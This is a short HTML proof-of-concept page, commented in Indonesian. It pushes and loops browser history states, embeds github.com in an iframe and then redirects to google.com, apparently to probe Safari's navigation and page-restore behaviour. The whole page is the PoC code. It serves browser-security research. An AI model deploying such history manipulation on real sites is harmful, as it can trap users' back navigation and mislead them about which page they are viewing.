<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Navigation Lifecycle Extended POC</title>
<style>
body { font-family: Arial; text-align: center; margin-top: 120px; }
button { padding: 16px 32px; font-size: 18px; }
iframe { width: 100%; height: 400px; border: 1px solid #ccc; margin-top: 20px; }
</style>
</head>
<body>

<h2>Navigation Lifecycle Extended POC</h2>
<button id="start">Start</button>

<script>
const startBtn = document.getElementById("start");

startBtn.onclick = function(){

    // Step 1: push multiple history states supaya Safari tunda restore
    history.pushState({}, '', location.pathname + '#state1');
    history.pushState({}, '', location.pathname + '#state2');
    history.replaceState({}, '', location.pathname + '#state3');

    // Step 2: buat iframe untuk menampilkan “konten lain”
    const iframe = document.createElement("iframe");
    iframe.src = "https://github.com"; // konten target
    document.body.appendChild(iframe);

    // Step 3: loop pushState ringan untuk menjaga halaman aktif
    let counter = 0;
    const interval = setInterval(()=>{
        history.pushState({}, '', location.pathname + '#keep' + counter);
        counter++;
        if(counter > 20){ // sekitar 7 detik (20 * 350ms ~ 7 detik)
            clearInterval(interval);
        }
    }, 350);

    // Step 4: fallback navigasi asli setelah 7 detik
    setTimeout(()=>{
        window.location.href = "https://www.google.com"; // kembali ke origin asli
    }, 7000);
};

// Step 5: handle pageshow restore
window.addEventListener("pageshow", function(e){
    if(e.persisted){
        history.replaceState({}, '', location.pathname + '#restored');
    }
});
</script>

</body>
</html>
